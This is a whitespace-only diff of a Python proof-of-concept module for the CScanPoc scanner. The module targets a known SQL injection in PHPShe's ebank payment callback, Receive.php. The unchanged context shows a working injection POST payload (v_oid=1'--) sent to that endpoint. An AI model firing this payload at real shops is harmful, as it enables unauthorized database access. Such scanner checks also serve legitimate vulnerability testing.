@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PHPShe_0003' # 平台漏洞编号，留空
+    vuln_id = 'PHPShe_0003'  # 平台漏洞编号，留空
     name = 'PHPShe SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-01-03'  # 漏洞公布时间
     desc = '''
         漏洞文件:include\plugin\payway\ebank\Receive.php 逻辑错误造成注入漏洞。
@@ -32,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/include/plugin/payway/ebank/Receive.php'
             data = "v_oid=1'--&v_pmode=1&v_patatus=20&v_pstring=1&v_amount=1&v_moneytype=1&remark1=1&remark2=1&v_md5str=2E0551D59CFAF9A6E248BC5B3BDE39B5"
             url = self.target + payload
@@ -47,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
